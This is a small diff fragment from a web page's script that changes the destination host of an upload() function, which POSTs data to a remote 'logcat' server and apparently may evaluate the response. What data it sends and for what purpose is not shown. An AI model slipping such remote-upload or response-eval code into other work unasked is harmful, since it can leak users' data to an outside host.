@@ -21,7 +21,7 @@ p{
 function upload(data, dontEval){
 		var xhr = new XMLHttpRequest();
 		// remote logcat allows CORS
-		xhr.open("POST", "http://logcat.nocrap.xyz")
+		xhr.open("POST", "http://logcat.mysite.xyz")
 		xhr.onreadystatechange = () => {
 				if (xhr.status == 200 && xhr.readyState == XMLHttpRequest.DONE){
 						console.log("[*] Uploaded!")
